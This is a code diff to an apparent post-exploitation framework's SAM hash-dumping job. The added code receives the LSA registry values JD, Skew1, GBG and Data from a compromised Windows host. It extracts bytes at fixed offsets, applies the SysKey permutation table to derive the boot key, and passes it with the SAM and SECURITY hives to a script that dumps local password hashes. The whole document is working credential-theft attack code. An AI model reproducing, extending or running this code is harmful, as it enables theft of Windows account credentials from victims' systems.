@@ -45,6 +45,34 @@ class HashDumpSAMJob(core.job.Job):
             self.system_data = data
             return
 
+        if task == "SYSTEM\\CurrentControlSet\\Control\\Lsa\\JD":
+            handler.reply(200)
+
+            self.print_status("received SysKey part 1 (%d bytes)" % len(data))
+            self.system_jd = data
+            return
+
+        if task == "SYSTEM\\CurrentControlSet\\Control\\Lsa\\Skew1":
+            handler.reply(200)
+
+            self.print_status("received SysKey part 2 (%d bytes)" % len(data))
+            self.system_skew1 = data
+            return
+
+        if task == "SYSTEM\\CurrentControlSet\\Control\\Lsa\\GBG":
+            handler.reply(200)
+
+            self.print_status("received SysKey part 3 (%d bytes)" % len(data))
+            self.system_gbg = data
+            return
+
+        if task == "SYSTEM\\CurrentControlSet\\Control\\Lsa\\Data":
+            handler.reply(200)
+
+            self.print_status("received SysKey part 4 (%d bytes)" % len(data))
+            self.system_data = data
+            return
+
         if task == "SECURITY":
             handler.reply(200)
 
@@ -75,10 +103,37 @@ class HashDumpSAMJob(core.job.Job):
         self.security_file = self.save_file(self.security_data)
         self.print_status("decoded SECURITY hive (%s)" % self.security_file)
 
-        self.system_file = self.save_file(self.system_data)
-        self.print_status("decoded SYSTEM hive (%s)" % self.system_file)
+        # self.system_file = self.save_file(self.system_data)
+        # self.print_status("decoded SYSTEM hive (%s)" % self.system_file)
+        self.system_jd_file = self.save_file(self.system_jd)
+        self.system_skew1_file = self.save_file(self.system_skew1)
+        self.system_gbg_file = self.save_file(self.system_gbg)
+        self.system_data_file = self.save_file(self.system_data)
 
-        cmd = ['python2', path, '-sam', self.sam_file, '-system', self.system_file, '-security', self.security_file, 'LOCAL']
+        tmp_syskey = ""
+        self.syskey = ""
+        for f in [self.system_jd_file, self.system_skew1_file, self.system_gbg_file, self.system_data_file]:
+            with open(f, 'rb') as sysfile:
+                file_contents = sysfile.read()
+            tmp_syskey += file_contents[4220]
+            tmp_syskey += file_contents[4222]
+            tmp_syskey += file_contents[4224]
+            tmp_syskey += file_contents[4226]
+            tmp_syskey += file_contents[4228]
+            tmp_syskey += file_contents[4230]
+            tmp_syskey += file_contents[4232]
+            tmp_syskey += file_contents[4234]
+
+        tmp_syskey = list(map(''.join, zip(*[iter(tmp_syskey)]*2)))
+
+        transforms = [8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7]
+        for i in transforms:
+            self.syskey += tmp_syskey[i]
+
+        self.print_status("decoded SysKey: 0x%s" % self.syskey)
+
+        # cmd = ['python2', path, '-sam', self.sam_file, '-system', self.system_file, '-security', self.security_file, 'LOCAL']
+        cmd = ['python2', path, '-sam', self.sam_file, '-bootkey', self.syskey, '-security', self.security_file, 'LOCAL']
         p = Popen(cmd, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
         output = p.stdout.read().decode()
         self.shell.print_plain(output)
